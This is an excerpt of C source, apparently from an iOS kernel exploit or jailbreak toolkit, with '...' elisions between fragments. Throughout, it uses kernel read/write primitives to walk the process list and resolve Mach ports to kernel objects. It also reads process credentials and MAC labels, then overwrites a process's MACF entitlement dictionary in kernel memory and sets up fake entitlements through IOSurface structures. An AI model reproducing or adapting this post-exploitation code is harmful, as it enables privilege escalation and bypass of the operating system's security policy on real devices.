...
static void kproc_foreach(kptr_t proc, bool (^match)(kptr_t, pid_t))
{
    ...
    while (KERN_POINTER_VALID(proc)) {
        pid = rk32(proc + OFFSET(proc, p_pid));
        if (g_exp.debug) {
            util_info("pid %u", pid);
            util_msleep(100);
        }
        ...
        next = rk64ptr(proc + OFFSET(proc, le_next));
        if (next == KPTR_NULL) {
            break;
        }
        proc = next;
...
static void kproc_foreach_reverse(kptr_t proc, bool (^match)(kptr_t, pid_t))
{
    ...
    while (KERN_POINTER_VALID(proc)) {
        ...
        prev = rk64ptr(proc + OFFSET(proc, le_prev));
        if (prev == KPTR_NULL) {
            break;
        }
...
kptr_t ipc_entry_lookup(mach_port_t port_name)
{
    ...
    uint32_t table_size = rk32(itk_space + OFFSET(ipc_space, is_table_size));
    uint32_t port_index = MACH_PORT_INDEX(port_name);
    if (port_index >= table_size) {
        util_warning("invalid port name %#x", port_name);
        return 0;
    }
    kptr_t is_table = rk64ptr(itk_space + OFFSET(ipc_space, is_table));
...
kptr_t port_name_to_ipc_port(mach_port_t port_name)
{
    ...
    kptr_t ipc_port = rk64ptr(entry + OFFSET(ipc_entry, ie_object));
    return ipc_port;
}
...
kptr_t port_name_to_kobject(mach_port_t port_name)
{
    ...
    kptr_t kobject = rk64ptr(ipc_port + OFFSET(ipc_port, ip_kobject));
    return kobject;
}
...
void debug_dump_ipc_port(mach_port_t port_name, kptr_t *kobj)
{
    ...
    kptr_t object = rk64ptr(entry + OFFSET(ipc_entry, ie_object));
    uint32_t ip_bits = rk32(object + OFFSET(ipc_port, ip_bits));
    uint32_t ip_refs = rk32(object + OFFSET(ipc_port, ip_references));
    kptr_t kobject = rk64ptr(object + OFFSET(ipc_port, ip_kobject));
...
{
    kptr_t proc_p_ucred = rk64ptr(proc + OFFSET(proc, p_ucred));
    kptr_t p_ucred_cr_label = proc_p_ucred + OFFSET(ucred, cr_posix);

    char old_cred[SIZE(posix_cred)];
    kread(p_ucred_cr_label, old_cred, SIZE(posix_cred));

    kptr_t cr_label = rk64ptr(p_ucred_cr_label + SIZE(posix_cred));

    util_info("cr_label %#llx", cr_label);
    if (cr_label) {
        int l_flags = rk32(cr_label + 0x00);
        util_info("l_flags %#x", l_flags);
        kptr_t labels[3];
        labels[0] = rk64ptr(cr_label + 0x08);
        labels[1] = rk64ptr(cr_label + 0x10);
        labels[2] = rk64ptr(cr_label + 0x18);
...
{
    char obj[0x28];
    kread(dict_addr, obj, sizeof(obj));
    ...
    dict->items_addr = rk64ptr(dict_addr + OFFSET(OSDictionary, dictionary));
    char *ptr = dict->data;
    ...
    kread(dict->items_addr, dict->items, alloc_size);
    for (int i = 0; i < dict->count; i++) {
        char obj[0x18];
        kread(dict->items[i].key, obj, sizeof(obj));
        // OSSymbol
...
struct kOSDict *proc_fetch_MACF(kptr_t proc)
{
    ...
    kptr_t cr_label = rk64ptr(p_ucred_cr_label);
    ...
    kptr_t MACF_slot = rk64ptr(cr_label + 0x08);
    if (MACF_slot == 0) {
...
void proc_write_MACF(kptr_t proc, struct kOSDict *macf)
{
    ...
    wk32(macf->self_addr + OFFSET(OSDictionary, count), macf->count);
    kwrite(macf->items_addr, macf->items, alloc_size);
}
...
void prepare_fake_entitlements(void)
{
    ...
    kptr_t surfClients = rk64ptr(surfRoot + OFFSET(IOSurfaceRootUserClient, surfaceClients));
    kptr_t surfClient = rk64ptr(surfClients + sizeof(kptr_t) * IOSurface_worker_id);
    kptr_t surface = rk64ptr(surfClient + OFFSET(IOSurfaceClient, surface));
    kptr_t values = rk64ptr(surface + OFFSET(IOSurface, values));
